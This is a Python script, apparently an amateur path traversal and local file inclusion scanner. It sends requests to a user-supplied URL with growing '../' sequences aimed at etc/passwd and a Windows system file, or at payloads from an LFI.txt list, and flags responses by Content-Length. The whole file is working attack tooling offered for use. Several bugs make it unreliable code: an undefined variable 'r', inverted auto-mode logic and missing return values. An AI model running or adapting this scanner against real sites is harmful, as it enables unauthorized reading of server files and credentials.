#!/usr/bin/python3
import requests
from time import sleep

global Length_check

def main():
    help()
    uwuurl = input("Set a URL >")
    print("URL {}\n--------------------------------------------------------".format(uwuurl))
    resoru = input("Set the Resource >")
    print("Resource {}\n--------------------------------------------------------".format(resoru))
    auto = bool(int(input("Set the AUTO mode [0] for False, [1] True >")))
    url = ("{}".format(uwuurl+resoru)) #jeez + is so enough
    global Length_check
    le_url_check = url+"Stalin_is_my_Daddy.php"
    r = requests.get(le_url_check)
    print("\t[!]====================[DONE SENDING A TEST]==================[!]\n")
    print("[*] :"+le_url_check + "\n")
    Length_check = int(r.headers['Content-Length'])
    Length_check -= 22
    print(auto)
    if auto == False:
            print("[+]\t\t\tAUTO SCAN\t\t\t[+] ")
            last,dot_sl = loca(uwuurl,resoru)
            if not last.endswith(".php"):
                last = last+".php"
            else:
                pass
            if dot_sl == -1:
                new_url = (url+last).split('\n')[0]
                len_ch = int(len(last))
                BUG  = a_request(new_url,len_ch)
                if BUG == 1 :
                    print("\n\t[!]====================[BUG]==================[!]\n")
                    print("I got {} at \n >>>>{}".format(last,new_url))
                else:
                    pass
            elif dot_sl >= 1:
                if dot_sl >1:
                    dot_sl -=1
                elif dot_sl == 1:
                    pass
                fur = "../" * dot_sl
                new_url = (url+fur+last).split('\n')[0]
                len_ch = int(len(last))
                len_ch += int(len(fur))
                BUG  = a_request(new_url,len_ch)
                if BUG == 1 :
                    print("\n\t[!]====================[BUG]==================[!]\n")
                    print("i got {} at \n >>>>{}".format(last,new_url))
                else:
                    pass
            print("----------------------------[LEAK]----------------------------------")
            try:
                for dots in range(10):
                    if dots == 0:
                        dot="/"
                    elif dots > 0:
                        dot = "../" * dots
                    paths =["etc/passwd","WINDOWS\system32\license.rtf"]
                    for path in paths:
                        if paths[1] == path:
                                a = dot.replace("/","\\")
                                check_na =len((a+path).split('\n')[0])
                                whole = (url+a+path).split('\n')[0]
                        else:
                            check_na =len((dot+path).split('\n')[0])
                            whole = (url+dot+path).split('\n')[0]
                        status = a_request(whole,check_na)
 
            except:
                print("Exiting...")
                pass
    elif auto == True:
        print("[+]\t\t\tAUTO SCAN\t\t\t[+] ")
        auto_true(url)
def auto_true(url):                ########################################
    print("im in auto fun now")

    try:
        for dots in range(1,10):
            dot = "../" * dots
            f = open("LFI.txt","r+")
            for line in f:
                len_check =len((dot+line).split('\n')[0])
                whole = (url+dot+line).split('\n')[0]
                #print(whole)
                status = a_request(whole,len_check)
    except:
        print("An error trying to get the uri")
def a_request(aurl,len_check): #,len_check ##(aurl)
    req = requests.get(aurl) ##note ?? remember that the https or http is importen for the requests lib ! add it yourself
    global Length_check
    if req.status_code == 200:
        ## its mean it may be vulnerable
        local_le = int(req.headers['Content-Length'])
        if local_le == Length_check:
            print("[-] : {}".format(aurl))
            #return 0
        elif local_le != Length_check:
            new_length = len_check+Length_check
            try:
                if new_length == local_le:
                    print("[-] : {}".format(aurl))
                    #return 0
                else:
                    print("\n\t[!]====================[LFI]==================[!]\n")
                    print("[+] : {} \n".format(aurl))
                    #return 1
            except:
                #print(aurl)
                print("there was an error while checkin the length")
    elif r.status_code != 200:
    #    print("its not  200")
        return 0
def loca(url,resoru):
    path = url.split("/")
    get_par =len(path) - 1
    last = path[get_par]

    resoru_path = resoru.split("=")
    get_path =resoru_path[1].find("/")
    if get_path == -1:
    	pass
    elif get_path >= 0:
    	dot_sl = get_path +1


    return last,dot_sl
def help():
    print ('''
      _____    ____        _      _   _    ____
     |_ " _|U |  _"\ u U  /"\  u | \ |"|  / __"| u
       | |   \| |_) |/  \/ _ \/ <|  \| |><\___ \/
      /| |\   |  _ <    / ___ \ U| |\  |u u___) |
     u |_|U   |_| \_\  /_/   \_\ |_| \_|  |____/>>
     _// \\_  //   \\_  \\    >> ||   \\,-.)(  (__)
    (__) (__)(__)  (__)(__)  (__)(_")  (_/(__)

    ''')
    sleep(0.3)
    print("\t\t\t  How to use\n \t[!]========================================[!] ")
    d = ("\t[+]========================================[+]\n")

    uri = ("[ https://www.site.com/page.php?=stuff ] \n[ https://www.site.com/page?=./path/stuff ]\nExample of what the tool is able to handle\n")

    Resource = ("[Resource]The part 'page.php?=stuff' is an exaple of Resource or the Resource Path\n")

    url = ("\n[url]The part 'https://www.site.com/page.php' is an example of an URL \n ")

    auto = ("\n[Auto]By defulte it's False which means that the tool gonna run a simple test on the site, If you gonna turn it on you should consider that the txt file LFI.txt is require for trying to find any possible leak of information from the server\n")
    info = [url,d,Resource,d,uri,d,auto,d]
    for i in info:
    	sleep(0.5)
    	print(i)
main()
